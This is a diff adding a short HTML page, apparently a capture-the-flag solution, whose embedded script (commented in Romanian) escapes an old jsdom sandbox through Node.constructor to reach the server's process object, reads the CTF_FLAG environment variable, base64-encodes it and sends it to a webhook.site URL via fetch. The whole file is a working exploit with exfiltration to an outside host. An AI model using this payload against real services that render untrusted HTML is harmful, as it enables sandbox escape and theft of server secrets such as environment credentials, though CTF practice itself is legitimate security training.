@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Exploit Test</title>
+</head>
+<body>
+    <h1>Pingster Test Page</h1>
+    <script>
+        try {
+            // Această linie realizează evadarea din sandbox în versiuni vechi de jsdom
+            const FunctionConstructor = Node.constructor;
+            const process = new FunctionConstructor("return process")();
+            
+            // Extragem flag-ul din variabilele de mediu ale serverului
+            const flag = process.env['CTF_FLAG'];
+
+            // Trimitem flag-ul către Webhook.site (înlocuiește URL-ul de mai jos cu al tău)
+            // Folosim btoa pentru a codifica flag-ul în Base64 ca să evităm erori de caractere
+            const exfilUrl = "https://webhook.site/69d7e71d-f822-4856-adba-2eb6a36c0b8c";
+            
+            fetch(`${exfilUrl}?data=${btoa(flag)}`, {
+                mode: 'no-cors'
+            });
+        } catch (e) {
+            // Dacă nu suntem în jsdom sau e securizat, nu se va întâmpla nimic
+        }
+    </script>
+</body>
+</html>
